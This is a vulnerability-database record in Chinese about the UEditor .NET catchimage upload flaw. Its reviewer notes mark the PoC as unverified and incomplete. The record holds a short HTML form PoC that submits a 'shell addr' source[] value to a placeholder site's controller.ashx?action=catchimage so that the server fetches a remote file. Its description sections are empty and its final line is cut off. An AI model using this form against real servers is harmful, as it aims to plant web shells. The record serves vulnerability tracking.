---
source: "hatch 补库批 20260928"
product: "UEditor / .NET catchimage"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ueditor .net版本上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：没有版本、认证或配置条件"
side_effects: "未执行；本文需注意的操作影响：缺证明任意后缀上传的关键步骤；没有远端文件URL、文件内容、绕过后缀、结果路径；本地上传表述不准确；form实际令服务端远程抓取source，不是直接multipart本地文件"
source_status: "unknown"
id: "vw-470a3dfead58c24af3314300"
entity_id: "ve-470a3dfead58c24af3314300"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：没有版本、认证或配置条件

代码与实验材料：HTML form仅提交source，末尾“上传文件名为1”截断，缺?.aspx关键变体

来源证据范围：无原始来源

- **证据待核（1）**：缺证明任意后缀上传的关键步骤；依据：没有远端文件URL、文件内容、绕过后缀、结果路径。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（2）**：本地上传表述不准确；依据：form实际令服务端远程抓取source，不是直接multipart本地文件。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ueditor .net版本上传漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

本地上传poc

    <form action="http://www.xxxxx.com/ueditor/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
    shell addr: <input type="text" name="source[]" />
     <input type="submit" value="Submit" />
    </form>

上传文件名为 1
